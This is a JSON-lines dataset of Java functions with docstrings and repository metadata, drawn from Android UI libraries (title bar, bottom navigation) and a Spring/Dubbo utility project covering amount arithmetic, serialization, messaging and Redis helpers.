{"docstring": "/**\n * \u83b7\u53d6\u5bfc\u822a\u680f\u9ad8\u5ea6\n *\n * @param context\n * @return\n */\n", "func_signal": "public static int getNavigationBarHeight(Context context)", "code": "{\n    int resourceId = context.getResources().getIdentifier(\"navigation_bar_height\", \"dimen\", \"android\");\n    return context.getResources().getDimensionPixelSize(resourceId);\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\statusbar\\StatusBarUtils.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u83b7\u53d6\u5c4f\u5e55\u5927\u5c0f\n *\n * @param context\n * @return\n */\n", "func_signal": "public static int[] getScreenPixelSize(Context context)", "code": "{\n    DisplayMetrics metrics = getDisplayMetrics(context);\n    return new int[]{metrics.widthPixels, metrics.heightPixels};\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\utils\\ScreenUtils.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u662f\u5426\u586b\u5145\u72b6\u6001\u680f\n *\n * @param show\n */\n", "func_signal": "public void showStatusBar(boolean show)", "code": "{\n    if (viewStatusBarFill != null) {\n        viewStatusBarFill.setVisibility(show ? View.VISIBLE : View.GONE);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u5224\u65ad a \u662f\u5426\u5927\u4e8e\u7b49\u4e8e b\n * \n * @param a\n * @param b\n * @return a&gt;=b \u8fd4\u56detrue, a&lt;b \u8fd4\u56defalse\n */\n", "func_signal": "public static boolean greaterThanOrEqualTo(double a, double b)", "code": "{\n\tBigDecimal v1 = BigDecimal.valueOf(a);\n\tBigDecimal v2 = BigDecimal.valueOf(b);\n\tif (v1.compareTo(v2) >= 0) {\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u7528\u4e8e\u89e3\u51b3\u5206\u5e03\u5f0f\u4e8b\u52a1\u7684\u6d88\u606f.\n *\n * @param goodsid\n */\n", "func_signal": "public void sendBizMessage(final long goodsid)", "code": "{\n    final long start = System.currentTimeMillis();\n    bizMqJmsTemplate.send(new MessageCreator() {\n        @Override\n        public Message createMessage(Session session) throws JMSException {\n            long end = System.currentTimeMillis();\n            log.info(\"createMessage use time\" + (end - start) + \"ms\");\n            BizOperator operator = new BizOperator(\"testDistributedTransaction\", goodsid);\n            return session.createTextMessage(JSONObject.toJSONString(operator));\n        }\n    });\n    long end = System.currentTimeMillis();\n    log.info(\"sendBizMessage use time\" + (end - start) + \"ms\");\n}", "path": "beautyssm_service_goods\\src\\main\\java\\com\\yingjun\\ssm\\core\\goods\\mq\\MQProducer.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u52a0\u6cd5\u8fd0\u7b97\n * \n * @param v1\n * @param v2\n * @return\n */\n", "func_signal": "public static double add(double v1, double v2)", "code": "{\n\tBigDecimal b1 = new BigDecimal(Double.toString(v1));\n\tBigDecimal b2 = new BigDecimal(Double.toString(v2));\n\treturn b1.add(b2).doubleValue();\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u5e8f\u5217\u5316\u5217\u8868\n * @param objList\n * @return\n */\n", "func_signal": "public static <T> byte[] serializeList(List<T> objList)", "code": "{\n\tif (objList == null || objList.isEmpty()) {\n\t\tthrow new RuntimeException(\"\u5e8f\u5217\u5316\u5bf9\u8c61\u5217\u8868(\" + objList + \")\u53c2\u6570\u5f02\u5e38!\");\n\t}\n\t@SuppressWarnings(\"unchecked\")\n\tSchema<T> schema = (Schema<T>) RuntimeSchema.getSchema(objList.get(0).getClass());\n\tLinkedBuffer buffer = LinkedBuffer.allocate(1024 * 1024);\n\tbyte[] protostuff = null;\n\tByteArrayOutputStream bos = null;\n\ttry {\n\t\tbos = new ByteArrayOutputStream();\n\t\tProtostuffIOUtil.writeListTo(bos, objList, schema, buffer);\n\t\tprotostuff = bos.toByteArray();\n\t} catch (Exception e) {\n\t\tthrow new RuntimeException(\"\u5e8f\u5217\u5316\u5bf9\u8c61\u5217\u8868(\" + objList + \")\u53d1\u751f\u5f02\u5e38!\", e);\n\t} finally {\n\t\tbuffer.clear();\n\t\ttry {\n\t\t\tif (bos != null) {\n\t\t\t\tbos.close();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n\treturn protostuff;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\ProtoStuffSerializerUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * Object\u5bf9\u8c61\u8f6cDouble <br/>\n * 1\u3001\u5982\u679cObject\u4e3a\u7a7a\u6216Object\u4e0d\u662f\u6570\u503c\u578b\u5bf9\u8c61:\u629b\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38 <br/>\n * 2\u3001Object\u4e3a\u6570\u503c\u578b\u5bf9\u8c61:\u8f6c\u4e3aDouble\u7c7b\u578b\u5e76\u8fd4\u56de <br/>\n * @param obj \u8981\u8f6c\u6362\u7684Object\u5bf9\u8c61 <br/>\n * @return Double\n */\n", "func_signal": "public static Double toDouble(Object obj)", "code": "{\n\tif (obj == null || !NumberUtils.isNumber(obj.toString())){\n\t\tthrow new NumberFormatException(\"\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38\");\n\t} else {\n\t\treturn Double.valueOf(obj.toString());\n\t}\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\NumberUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * Object\u5bf9\u8c61\u8f6cInteger <br/>\n * 1\u3001\u5982\u679cObject\u4e3a\u7a7a\u6216Object\u4e0d\u662f\u6574\u6570\u578b\u5bf9\u8c61:\u629b\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38 <br/>\n * 2\u3001Object\u4e3a\u6574\u6570\u578b\u5bf9\u8c61:\u8f6c\u4e3aInteger\u7c7b\u578b\u5e76\u8fd4\u56de <br/>\n * @param obj \u8981\u8f6c\u6362\u7684Object\u5bf9\u8c61 <br/>\n * @return Integer\n */\n", "func_signal": "public static Integer toInteger(Object obj)", "code": "{\n\tif (obj == null || !NumberUtils.isDigits(obj.toString())){\n\t\tthrow new NumberFormatException(\"\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38\");\n\t} else {\n\t\treturn Integer.valueOf(obj.toString());\n\t}\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\NumberUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u5224\u65ad a \u662f\u5426\u5927\u4e8e b\n * \n * @param a\n * @param b\n * @return a&gt;b \u8fd4\u56detrue, a&lt;=b \u8fd4\u56de false\n */\n", "func_signal": "public static boolean bigger(double a, double b)", "code": "{\n\tBigDecimal v1 = BigDecimal.valueOf(a);\n\tBigDecimal v2 = BigDecimal.valueOf(b);\n\tif (v1.compareTo(v2) == 1) {\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u5224\u65ad\u5bf9\u8c61\u503c\u662f\u5426\u4e3a\u6570\u5b57,\u5305\u542b\u6574\u6570\u548c\u5c0f\u6570(\u5982:001234,7899,7.99,99.00)\n * @param obj \u8981\u5224\u65ad\u7684\u503c.\n * @return true or false.\n */\n", "func_signal": "public static boolean isNumber(Object obj)", "code": "{\n\tif (obj == null){\n\t\treturn false;\n\t}\n\treturn NumberUtils.isNumber(obj.toString());\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\NumberUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u51cf\u6cd5\u8fd0\u7b97\n * \n * @param v1\u88ab\u51cf\u6570\n * @param v2\u51cf\u6570\n * @return\n */\n", "func_signal": "public static double sub(double v1, double v2)", "code": "{\n\tBigDecimal b1 = new BigDecimal(Double.toString(v1));\n\tBigDecimal b2 = new BigDecimal(Double.toString(v2));\n\treturn b1.subtract(b2).doubleValue();\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \n * \u56db\u820d\u4e94\u5165\n * \n * @param v\u9700\u8981\u56db\u820d\u4e94\u5165\u7684\u6570\u5b57\n * @param scale\u5c0f\u6570\u70b9\u540e\u4fdd\u7559\u51e0\u4f4d\n * @return\n */\n", "func_signal": "public static double round(double v, int scale)", "code": "{\n\tif (scale < 0) {\n\t\tthrow new IllegalArgumentException(\"The scale must be a positive integer or zero\");\n\t}\n\tBigDecimal b = new BigDecimal(Double.toString(v));\n\tBigDecimal one = new BigDecimal(\"1\");\n\treturn b.divide(one, scale, BigDecimal.ROUND_HALF_UP).doubleValue();\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u5224\u65ad a \u4e0e b \u662f\u5426\u76f8\u7b49\n * \n * @param a\n * @param b\n * @return a==b \u8fd4\u56detrue, a!=b \u8fd4\u56defalse\n */\n", "func_signal": "public static boolean equal(double a, double b)", "code": "{\n\tBigDecimal v1 = BigDecimal.valueOf(a);\n\tBigDecimal v2 = BigDecimal.valueOf(b);\n\tif (v1.compareTo(v2) == 0) {\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u7531\u4e8eJedisCluster\u6ca1\u6709\u63d0\u4f9b\u5bf9keys\u547d\u4ee4\u7684\u5c01\u88c5\uff0c\u53ea\u80fd\u81ea\u5df1\u5b9e\u73b0\n * @param pattern\n * @return\n     */\n", "func_signal": "public Set<String> keys(String pattern)", "code": "{\n\tSet<String> keys = new HashSet<String>();\n\tMap<String, JedisPool> clusterNodes = jedisCluster.getClusterNodes();\n\tfor(String k : clusterNodes.keySet()){\n\t\tJedisPool jp = clusterNodes.get(k);\n\t\tJedis connection = jp.getResource();\n\t\ttry {\n\t\t\tkeys.addAll(connection.keys(pattern));\n\t\t} catch(Exception e){\n\t\t\te.printStackTrace();\n\t\t} finally{\n\t\t\t//\u7528\u5b8c\u4e00\u5b9a\u8981close\u8fd9\u4e2a\u94fe\u63a5\uff01\uff01\uff01\n\t\t\tconnection.close();\n\t\t}\n\t}\n\treturn keys;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\cache\\RedisClusterCache.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\n * @param paramArrayOfByte\n * @param targetClass\n * @return\n */\n", "func_signal": "public static <T> T deserialize(byte[] paramArrayOfByte, Class<T> targetClass)", "code": "{\n\tif (paramArrayOfByte == null || paramArrayOfByte.length == 0) {\n\t\tthrow new RuntimeException(\"\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u53d1\u751f\u5f02\u5e38,byte\u5e8f\u5217\u4e3a\u7a7a!\");\n\t}\n\tT instance = null;\n\ttry {\n\t\tinstance = targetClass.newInstance();\n\t} catch (InstantiationException  e1) {\n\t\tthrow new RuntimeException(\"\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u4f9d\u636e\u7c7b\u578b\u521b\u5efa\u5bf9\u8c61\u5931\u8d25!\", e1);\n\t} catch(IllegalAccessException e2){\n\t\tthrow new RuntimeException(\"\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u4f9d\u636e\u7c7b\u578b\u521b\u5efa\u5bf9\u8c61\u5931\u8d25!\", e2);\n\t}\n\tSchema<T> schema = RuntimeSchema.getSchema(targetClass);\n\tProtostuffIOUtil.mergeFrom(paramArrayOfByte, instance, schema);\n\treturn instance;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\ProtoStuffSerializerUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u53cd\u5e8f\u5217\u5316\u5217\u8868\n * @param paramArrayOfByte\n * @param targetClass\n * @return\n */\n", "func_signal": "public static <T> List<T> deserializeList(byte[] paramArrayOfByte, Class<T> targetClass)", "code": "{\n\tif (paramArrayOfByte == null || paramArrayOfByte.length == 0) {\n\t\tthrow new RuntimeException(\"\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u53d1\u751f\u5f02\u5e38,byte\u5e8f\u5217\u4e3a\u7a7a!\");\n\t}\n\n\tSchema<T> schema = RuntimeSchema.getSchema(targetClass);\n\tList<T> result = null;\n\ttry {\n\t\tresult = ProtostuffIOUtil.parseListFrom(new ByteArrayInputStream(paramArrayOfByte), schema);\n\t} catch (IOException e) {\n\t\tthrow new RuntimeException(\"\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u5217\u8868\u53d1\u751f\u5f02\u5e38!\", e);\n\t}\n\treturn result;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\ProtoStuffSerializerUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u7528\u4e8e\u53d1\u9001email\u7684\u6d88\u606f.\n *\n * @param mail\n */\n", "func_signal": "public void sendMailMessage(final MailParam mail)", "code": "{\n    final long start = System.currentTimeMillis();\n    mailMqJmsTemplate.send(new MessageCreator() {\n        public Message createMessage(Session session) throws JMSException {\n            long end = System.currentTimeMillis();\n            log.info(\"createMessage use time\" + (end - start) + \"ms\");\n            return session.createTextMessage(JSONObject.toJSONString(mail));\n        }\n    });\n    long end = System.currentTimeMillis();\n    log.info(\"sendMailMessage use time\" + (end - start) + \"ms\");\n}", "path": "beautyssm_service_goods\\src\\main\\java\\com\\yingjun\\ssm\\core\\goods\\mq\\MQProducer.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u5224\u65ad a \u662f\u5426\u5c0f\u4e8e b\n * \n * @param a\n * @param b\n * @return a&lt;b \u8fd4\u56detrue, a&gt;=b \u8fd4\u56de false\n */\n", "func_signal": "public static boolean lessThan(double a, double b)", "code": "{\n\tBigDecimal v1 = BigDecimal.valueOf(a);\n\tBigDecimal v2 = BigDecimal.valueOf(b);\n\tif (v1.compareTo(v2) == -1) {\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u4e58\u6cd5\u8fd0\u7b97\n * \n * @param v1\u88ab\u4e58\u6570\n * @param v2\u4e58\u6570\n * @return\n */\n", "func_signal": "public static double mul(double v1, double v2)", "code": "{\n\tBigDecimal b1 = new BigDecimal(Double.toString(v1));\n\tBigDecimal b2 = new BigDecimal(Double.toString(v2));\n\treturn b1.multiply(b2).doubleValue();\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\AmountUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * \u5224\u65ad\u5bf9\u8c61\u503c\u662f\u5426\u4e3a\u7eaf\u6570\u5b57\u7ec4\u6210(\u5982:001234,7899),\u53ea\u6709\u7eaf\u6570\u5b57\u7684\u503c\u624d\u80fd\u8f6cLong\u6216Integer.\n * @param obj \u8981\u5224\u65ad\u7684\u503c.\n * @return true or false.\n */\n", "func_signal": "public static boolean isDigits(Object obj)", "code": "{\n\tif (obj == null){\n\t\treturn false;\n\t}\n\treturn NumberUtils.isDigits(obj.toString());\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\NumberUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * Object\u5bf9\u8c61\u8f6cBigDecimal <br/>\n * 1\u3001\u5982\u679cObject\u4e3a\u7a7a\u6216Object\u4e0d\u662f\u6570\u503c\u578b\u5bf9\u8c61:\u629b\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38 <br/>\n * 2\u3001Object\u4e3a\u6570\u503c\u578b\u5bf9\u8c61:\u8f6c\u4e3aBigDecimal\u7c7b\u578b\u5e76\u8fd4\u56de <br/>\n * @param obj \u8981\u8f6c\u6362\u7684Object\u5bf9\u8c61 <br/>\n * @return BigDecimal\n */\n", "func_signal": "public static BigDecimal toBigDecimal(Object obj)", "code": "{\n\tif (obj == null || !NumberUtils.isNumber(obj.toString())){\n\t\tthrow new NumberFormatException(\"\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38\");\n\t} else {\n\t\treturn new BigDecimal(obj.toString());\n\t}\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\NumberUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * Object\u5bf9\u8c61\u8f6cLong <br/>\n * 1\u3001\u5982\u679cObject\u4e3a\u7a7a\u6216Object\u4e0d\u662f\u6574\u6570\u578b\u5bf9\u8c61:\u629b\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38 <br/>\n * 2\u3001Object\u4e3a\u6574\u6570\u578b\u5bf9\u8c61:\u8f6c\u4e3aLong\u7c7b\u578b\u5e76\u8fd4\u56de <br/>\n * @param obj \u8981\u8f6c\u6362\u7684Object\u5bf9\u8c61 <br/>\n * @return Long\n */\n", "func_signal": "public static Long toLong(Object obj)", "code": "{\n\tif (obj == null || !NumberUtils.isDigits(obj.toString())){\n\t\tthrow new NumberFormatException(\"\u6570\u5b57\u683c\u5f0f\u5316\u5f02\u5e38\");\n\t} else {\n\t\treturn Long.valueOf(obj.toString());\n\t}\n}", "path": "beautyssm_common\\src\\main\\java\\com\\yingjun\\ssm\\common\\util\\number\\NumberUtil.java", "repo_name": "wosyingjun/beauty_ssm_dubbo", "stars": 830, "license": "None", "language": "java", "size": 133}
{"docstring": "/**\n * Restore Bottom Navigation with or without animation\n *\n * @param withAnimation Boolean\n */\n", "func_signal": "public void restoreBottomNavigation(boolean withAnimation)", "code": "{\n\tif (bottomNavigationBehavior != null) {\n\t\tbottomNavigationBehavior.resetOffset(this, withAnimation);\n\t} else {\n\t\t// Show bottom navigation\n\t\tViewCompat.animate(this)\n\t\t\t\t.translationY(0)\n\t\t\t\t.setInterpolator(new LinearOutSlowInInterpolator())\n\t\t\t\t.setDuration(withAnimation ? 300 : 0)\n\t\t\t\t.start();\n\t}\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Update Small items UI\n *\n * @param itemIndex   int: Selected item position\n * @param useCallback boolean: Use or not the callback\n */\n", "func_signal": "private void updateSmallItems(final int itemIndex, boolean useCallback)", "code": "{\n\n\tif (currentItem == itemIndex) {\n\t\tif (tabSelectedListener != null && useCallback) {\n\t\t\ttabSelectedListener.onTabSelected(itemIndex, true);\n\t\t}\n\t\treturn;\n\t}\n\n\tif (tabSelectedListener != null && useCallback) {\n\t\tboolean selectionAllowed = tabSelectedListener.onTabSelected(itemIndex, false);\n\t\tif (!selectionAllowed) return;\n\t}\n\n\tint activeMarginTop = (int) resources.getDimension(R.dimen.bottom_navigation_small_margin_top_active);\n\tint inactiveMargin = (int) resources.getDimension(R.dimen.bottom_navigation_small_margin_top);\n\n\tfor (int i = 0; i < views.size(); i++) {\n\n\t\tif (i == itemIndex) {\n\n\t\t\tfinal FrameLayout container = (FrameLayout) views.get(itemIndex).findViewById(R.id.bottom_navigation_small_container);\n\t\t\tfinal TextView title = (TextView) views.get(itemIndex).findViewById(R.id.bottom_navigation_small_item_title);\n\t\t\tfinal ImageView icon = (ImageView) views.get(itemIndex).findViewById(R.id.bottom_navigation_small_item_icon);\n\t\t\tfinal TextView notification = (TextView) views.get(itemIndex).findViewById(R.id.bottom_navigation_notification);\n\n\t\t\ticon.setSelected(true);\n\t\t\tAHHelper.updateTopMargin(icon, inactiveMargin, activeMarginTop);\n\t\t\tAHHelper.updateLeftMargin(notification, notificationInactiveMarginLeft, notificationActiveMarginLeft);\n\t\t\tAHHelper.updateTopMargin(notification, notificationInactiveMarginTop, notificationActiveMarginTop);\n\t\t\tAHHelper.updateTextColor(title, itemInactiveColor, itemActiveColor);\n\t\t\tAHHelper.updateAlpha(title, 0, 1);\n\t\t\tAHHelper.updateWidth(container, notSelectedItemWidth, selectedItemWidth);\n\t\t\tAHHelper.updateDrawableColor(context, items.get(itemIndex).getDrawable(context), icon,\n\t\t\t\t\titemInactiveColor, itemActiveColor, forceTint);\n\n\t\t\tif (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && colored) {\n\t\t\t\tint finalRadius = Math.max(getWidth(), getHeight());\n\t\t\t\tint cx = (int) views.get(itemIndex).getX() + views.get(itemIndex).getWidth() / 2;\n\t\t\t\tint cy = views.get(itemIndex).getHeight() / 2;\n\n\t\t\t\tif (circleRevealAnim != null && circleRevealAnim.isRunning()) {\n\t\t\t\t\tcircleRevealAnim.cancel();\n\t\t\t\t\tsetBackgroundColor(items.get(itemIndex).getColor(context));\n\t\t\t\t\tbackgroundColorView.setBackgroundColor(Color.TRANSPARENT);\n\t\t\t\t}\n\n\t\t\t\tcircleRevealAnim = ViewAnimationUtils.createCircularReveal(backgroundColorView, cx, cy, 0, finalRadius);\n\t\t\t\tcircleRevealAnim.setStartDelay(5);\n\t\t\t\tcircleRevealAnim.addListener(new Animator.AnimatorListener() {\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void onAnimationStart(Animator animation) {\n\t\t\t\t\t\tbackgroundColorView.setBackgroundColor(items.get(itemIndex).getColor(context));\n\t\t\t\t\t}\n\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void onAnimationEnd(Animator animation) {\n\t\t\t\t\t\tsetBackgroundColor(items.get(itemIndex).getColor(context));\n\t\t\t\t\t\tbackgroundColorView.setBackgroundColor(Color.TRANSPARENT);\n\t\t\t\t\t}\n\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void onAnimationCancel(Animator animation) {\n\t\t\t\t\t}\n\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void onAnimationRepeat(Animator animation) {\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t\tcircleRevealAnim.start();\n\t\t\t} else if (colored) {\n\t\t\t\tAHHelper.updateViewBackgroundColor(this, currentColor,\n\t\t\t\t\t\titems.get(itemIndex).getColor(context));\n\t\t\t} else {\n\t\t\t\tsetBackgroundColor(defaultBackgroundColor);\n\t\t\t\tbackgroundColorView.setBackgroundColor(Color.TRANSPARENT);\n\t\t\t}\n\n\t\t} else if (i == currentItem) {\n\n\t\t\tfinal View container = views.get(currentItem).findViewById(R.id.bottom_navigation_small_container);\n\t\t\tfinal TextView title = (TextView) views.get(currentItem).findViewById(R.id.bottom_navigation_small_item_title);\n\t\t\tfinal ImageView icon = (ImageView) views.get(currentItem).findViewById(R.id.bottom_navigation_small_item_icon);\n\t\t\tfinal TextView notification = (TextView) views.get(currentItem).findViewById(R.id.bottom_navigation_notification);\n\n\t\t\ticon.setSelected(false);\n\t\t\tAHHelper.updateTopMargin(icon, activeMarginTop, inactiveMargin);\n\t\t\tAHHelper.updateLeftMargin(notification, notificationActiveMarginLeft, notificationInactiveMarginLeft);\n\t\t\tAHHelper.updateTopMargin(notification, notificationActiveMarginTop, notificationInactiveMarginTop);\n\t\t\tAHHelper.updateTextColor(title, itemActiveColor, itemInactiveColor);\n\t\t\tAHHelper.updateAlpha(title, 1, 0);\n\t\t\tAHHelper.updateWidth(container, selectedItemWidth, notSelectedItemWidth);\n\t\t\tAHHelper.updateDrawableColor(context, items.get(currentItem).getDrawable(context), icon,\n\t\t\t\t\titemActiveColor, itemInactiveColor, forceTint);\n\n\t\t}\n\t}\n\n\tcurrentItem = itemIndex;\n\tif (currentItem > 0 && currentItem < items.size()) {\n\t\tcurrentColor = items.get(currentItem).getColor(context);\n\t} else if (currentItem == CURRENT_ITEM_NONE) {\n\t\tsetBackgroundColor(defaultBackgroundColor);\n\t\tbackgroundColorView.setBackgroundColor(Color.TRANSPARENT);\n\t}\n\n\t/*\n\tif (tabSelectedListener != null && useCallback) {\n\t\ttabSelectedListener.onTabSelected(itemIndex, false);\n\t}\n\t*/\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set notification background color\n *\n * @param color int\n */\n", "func_signal": "public void setNotificationBackgroundColor(@ColorInt int color)", "code": "{\n\tthis.notificationBackgroundColor = color;\n\tupdateNotifications(true, UPDATE_ALL_NOTIFICATIONS);\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set notification typeface\n *\n * @param typeface Typeface\n */\n", "func_signal": "public void setTitleTypeface(Typeface typeface)", "code": "{\n\tthis.titleTypeface = typeface;\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "//\u5904\u7406\u6ed1\u52a8\u4e8b\u4ef6\n", "func_signal": "@Override\npublic void onNestedScroll(CoordinatorLayout coordinatorLayout, View child, View target, int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed)", "code": "{\n//        Log.d(\"TAG\",\"dxConsumed = [\" + dxConsumed + \"], dyConsumed = [\" + dyConsumed + \"], dxUnconsumed = [\" + dxUnconsumed + \"], dyUnconsumed = [\" + dyUnconsumed + \"]\");\n    if (animationTime)\n        return;\n    switch (style) {\n        case TRANSLATE:\n            if (dyConsumed > 0 && dyConsumed > mTouchSlop) {//\u624b\u6307\u4e0a\u6ed1\n                hide(child);\n            } else if (dyConsumed < 0 && dyConsumed < 2 * mTouchSlop) {//\u624b\u6307\u4e0b\u6ed1\n                show(child);\n            }\n            break;\n        case SCALE_OFFSET:\n        case TRANSLATE_OFFSET:\n            clipOffset();\n            move(mOffset, child);\n            if ((mOffset < distanceToHide && dyConsumed > 0) || (mOffset > 0 && dyConsumed < 0)) {\n                mOffset += dyConsumed;\n            }\n            break;\n        case SCALE:\n            if (dyConsumed > 0 && dyConsumed > mTouchSlop) {//\u624b\u6307\u4e0a\u6ed1\n                toggleScale(child, false);\n            } else if (dyConsumed < 0 && dyConsumed < 2 * mTouchSlop) {//\u624b\u6307\u4e0b\u6ed1\n                toggleScale(child, true);\n            }\n            break;\n        default:\n            style = TRANSLATE;\n            break;\n    }\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\QuickReturnBottomBehavior.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set title text size\n *\n * @param activeSize\n * @param inactiveSize\n */\n", "func_signal": "public void setTitleTextSize(float activeSize, float inactiveSize)", "code": "{\n\tthis.titleActiveTextSize = activeSize;\n\tthis.titleInactiveTextSize = inactiveSize;\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
